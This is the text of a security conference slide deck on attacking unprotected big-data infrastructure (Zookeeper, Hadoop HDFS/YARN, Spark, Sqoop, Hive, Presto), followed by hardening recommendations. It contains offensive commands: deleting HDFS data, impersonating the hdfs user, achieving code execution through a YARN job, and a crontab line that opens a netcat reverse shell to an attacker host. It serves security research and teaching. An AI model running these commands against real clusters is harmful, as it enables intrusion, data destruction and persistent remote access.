THE UNBELIEVABLE INSECURITY OF THE
BIG DATA STACK
AN OFFENSIVE APPROACH TO ANALYZING HUGE AND COMPLEX INFRASTRUCTURES
SHEILA A. BERTA (@UnaPibaGeek)

WHO AM I?
SHEILA A. BERTA (@UnaPibaGeek)
Head of Security Research at Dreamlab Technologies (Swiss Infosec Company)  Offensive Security Researcher - I like to break everything :)  Developer in ASM (Microcontrollers / x86/x64), C/C++, Python and Go  RE, Hardware Hacking & Exploit Development  DCA, CKA, CKAD, CKS (Cloud Native Specialist)  Speaker at BH USA Briefings (x4), DEF CON (x4), HITB, SCSD & more

LAYERS OF THE BIG DATA STACK

1

Data Ingestion

2

Data Storage

3

Data Processing

4

Data Access

5 Cluster Management

LAYERS OF THE BIG DATA STACK

1

Data Ingestion

2

Data Storage

3

Data Processing

EMR

4

Data Access

5 Cluster Management

BIG DATA ARCHITECTURES
PRESTO WORKERS YARN HDFS

PRESTO COORDINATOR
GO REST API FRONT-END

THE ANALYSIS METHODOLOGY
Analysis of the management layer's components. E.g.: Zookeeper, Ambari, etc.

CLUSTER MANAGEMENT DATA INGESTION DATA STORAGE DATA PROCESSING DATA ACCESS

Analysis of the data ingestion's components. E.g.: Flume, Kafka, Kinesis, Sqoop, etc.
Analysis of the data storage's components. E.g.: HDFS and HDFS-based storage, S3, etc.
Analysis of the data processing's components. E.g.: Spark, Storm, Flink, etc.

Analysis of the data access' components. E.g.: Impala, Presto, Druid, etc.

01
MANAGEMENT LAYER
UNVEILING THE INSECURITY OF ZOOKEEPER AND AMBARI: ATTACKING THE CLUSTER'S HEART

ZOOKEEPER ARCHITECTURE AND PORTS

ZOOKEEPER

SERVICE

NODE 1

NODE 2

NODE 3

NODE N

ZOOKEEPER CLIENT

ATTACKING ZOOKEEPER
https://zookeeper.apache.org/releases.html#download ./zkCli.sh -server <node_ip>:2181

ATTACKING ZOOKEEPER
BROWSE ZNODES
ls and get commands
CREATE ZNODES
create ./znode_path new_config_data
EDIT ZNODES
set ./znode_path config_data_edit
DELETE ZNODES
delete ./znode_path

THE SECOND DOOR OF AMBARI

THE SECOND DOOR OF AMBARI
01 02 03

02
STORAGE LAYER
INSECURITY IN THE DATA STORAGE LAYER: ABUSING HADOOP RPC/IPC

HADOOP ARCHITECTURE

YARN HDFS

RESOURCE MANAGER NODE MANAGER
NAMENODE DATANODE

MASTER NODE NAMENODE
RESOURCE MANAGER

MASTER NODE NAMENODE
RESOURCE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

HADOOP IPC/RPC

namenode-address; port: 8020
hadoop fs ­ls / hadoop fs ­mkdir /hacked hadoop fs ­rm ­r /data

NAME NODE

DATA NODES

core-site xml

hdfs-site xml

mapred-site xml

yarn-site xml

CRAFTING HADOOP XML FILES
<configuration xmlns:xi="http://www.w3.org/2001/XInclude">
<property> <name>fs.defaultFS</name> <value>hdfs://NAMESPACE</value> <final>true</final>
</property>
</configuration>

core-site xml

CRAFTING HADOOP XML FILES
<configuration xmlns:xi="http://www.w3.org/2001/XInclude">
<property> <name>dfs.nameservices</name> <value>NAMESPACE</value>
</property>
<property> <name>dfs.ha.namenodes.NAMESPACE</name> <value>NAMENODE1-ID,NAMENODE2-ID</value>
</property>
<property> <name>dfs.namenode.rpc-address.NAMESPACE.NAMENODE1-ID</name> <value>NAMENODE1-DNS:8020</value>
</property>
<property> <name>dfs.client.failover.proxy.provider.NAMESPACE</name> <value>org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider</value>
</property>
</configuration>

hdfs-site xml

CRAFTING HADOOP XML FILES
hdfs-site xml

CRAFTING HADOOP XML FILES
<configuration xmlns:xi="http://www.w3.org/2001/XInclude">"> <property> <name>mapreduce.jobhistory.address</name> <value>NAMENODE-DNS:10020</value> </property>
</configuration>

mapred-site xml

CRAFTING HADOOP XML FILES
<configuration xmlns:xi="http://www.w3.org/2001/XInclude">
<property> <name>yarn.resourcemanager.address</name> <value>NAMENODE-DNS:8050</value>
</property>
<property> <name>yarn.resourcemanager.hostname</name> <value>NAMENODE-DNS</value>
</property>
</configuration>

yarn-site xml

REMOTELY COMPROMISING HADOOP VIA IPC/RPC
Dockerfile

REMOTELY COMPROMISING HADOOP VIA IPC/RPC
$ docker image build -t hadoop_lab . $ docker container run -it --name hadoop-lab --net=host hadoop_lab /bin/bash
[root@docker]# mkdir config && cd config # Place the xml files in this directory [root@docker]# cp /opt/hadoop-3.2.2/etc/hadoop/log4j.properties ./
[root@docker]# vi /etc/hosts # Example: 192.168.162.110 c2100-hadoopmaster.c2100-hadoopmaster.localdomain 192.168.162.111 c2100-hadoopresman.c2100-hadoopresman.localdomain

REMOTELY COMPROMISING HADOOP VIA IPC/RPC
[root@docker]# hadoop ­-config . fs ­ls /

IMPERSONATING HADOOP USERS
[root@docker]# HADOOP_USER_NAME=hdfs hadoop ­-config . fs ­mkdir /hacked

03
PROCESSING LAYER
DEVELOPING A MALICIOUS YARN APPLICATION

HADOOP ARCHITECTURE

YARN HDFS

RESOURCE MANAGER NODE MANAGER
NAMENODE DATANODE

MASTER NODE NAMENODE
RESOURCE MANAGER

MASTER NODE NAMENODE
RESOURCE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

HADOOP ARCHITECTURE

YARN HDFS

RESOURCE MANAGER NODE MANAGER
NAMENODE DATANODE

MASTER NODE NAMENODE
RESOURCE MANAGER

MASTER NODE NAMENODE
RESOURCE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

SLAVE NODE DATANODE
NODE MANAGER

IMPROVING YARN-SITE XML FILE

<configuration xmlns:xi="http://www.w3.org/2001/XInclude">
<property> <name>yarn.application.classpath</name> <value>$HADOOP_CONF_DIR, /usr/hdp/3.1.4.0-315/hadoop/*, /usr/hdp/3.1.4.0-315/hadoop/lib/*, /usr/hdp/current/hadoop-hdfs-client/*, /usr/hdp/current/hadoop-hdfs-client/lib/*, /usr/hdp/current/hadoop-yarn-client/*, /usr/hdp/current/hadoop-yarn-client/lib/* </value>
</property>
<!-- optional --> <property>
<name>yarn.nodemanager.remote-app-log-dir</name> <value>/app-logs</value> </property>
</configuration>

yarn-site xml
http://NAMENODE-IP:50070/conf http://RESMAN-IP:8088/conf

YARN APPLICATION
https://github.com/hortonworks/simple-yarn-app

COMPILING THE YARN APPLICATION
[root@docker]# git clone https://github.com/hortonworks/simple-yarn-app [root@docker]# cd simple-yarn-app
[root@docker]# vi pom.xml
<dependency> <groupId>org.apache.hadoop</groupId> <artifactId>hadoop-yarn-client</artifactId> <version>2.2.0</version>
</dependency> <dependency>
<groupId>org.apache.hadoop</groupId> <artifactId>hadoop-common</artifactId> <version>2.2.0</version> </dependency>
[root@docker]# mvn package

ACHIEVING RCE VIA YARN
[root@docker]# HADOOP_USER_NAME=hdfs hadoop --config . fs -copyFromLocal /path/to/simpleyarn-app-1.1.0.jar /jars/
[root@docker]# HADOOP_USER_NAME=hdfs hadoop --config . jar /local/path/to/simple-yarnapp-1.1.0.jar com.hortonworks.simpleyarnapp.Client <command> <instances> /jars/simpleyarn-app-1.1.0.jar

ACHIEVING RCE VIA YARN
[root@docker]# HADOOP_USER_NAME=hdfs yarn --config . logs -applicationId <application_id> -log_files stdout

MALICIOUS YARN APPLICATION

ApplicationMaster.java

Client.java

(crontab -l && echo "0 0 * * * nc -nv attacker_ip 1337 -e /bin/bash") | crontab -

WHAT ABOUT APACHE SPARK?

WORKER NODES

spark-master-address; port: 7077

Spark Master IP

SPARK MASTER

Attacker IP Command

<- talk on Spark hacking!
(by @ayoul3)

https://youtu.be/EAzdGo-i8vE

04
INGESTION LAYER
INTERFERING INGESTION CHANNELS

DATA INGESTION

SOURCES

INGESTION CHANNELS

SINK/STORAGE

SPARK [STRUCTURED] STREAMING

SPARK STREAMING

batches of data

SPARK ENGINE

processed data

SPARK [STRUCTURED] STREAMING

Spark Streaming TCP Socket example:

Attacker:

Target:

APACHE SQOOP

sqoop-server; port 12000

INTERFERING SQOOP CHANNELS
http://sqoop-server:12000/sqoop/version http://archive.apache.org/dist/sqoop/

INTERFERING SQOOP CHANNELS
01 CONNECT TO REMOTE SQOOP SERVER 02 CREATE MALICIOUS LINKS 03 CREATE MALICIOUS JOB 04 START MALICIOUS JOB

05
DATA ACCESS LAYER
ABUSING DATA ACCESS TECHNOLOGIES

DATA ACCESS
PRESTO WORKERS YARN HDFS

PRESTO COORDINATOR
GO REST API
FRONT-END

EXPOSED DASHBOARDS

http://hive-server:10002

http://presto-coordinator:8285

http://hbase-master:17010

HIVE JDBC INTERFACE

jdbc:hive2://hive-server-ip:10000

http://squirrel-sql.sourceforge.net/

> show databases;

> show tables;

> use prod;

CONCLUSION
FINAL THOUGHTS AND RECOMMENDATIONS

SECURITY RECOMMENDATIONS

01

REDUCE THE ATTACK SURFACE
Remove dashboards and interfaces that are not used.

02

SET UP A FIREWALL
Block unnecessary ports and secure the perimeter.

04

IMPLEMENT AUTHENTICATION
Most technologies support advanced authentication mechanisms.

05

MANAGE AUTHORIZATION
Apply the principle of least privilege.

03

SECURE CREDENTIALS
Change all the default credentials in the technologies implemented.

06

SECURE COMMUNICATIONS
Secure the communication channels between the different technologies.

THANKS!
SHEILA A. BERTA (@UnaPibaGeek) sheila.berta@dreamlab.net / shey.x7@gmail.com www.dreamlab.net

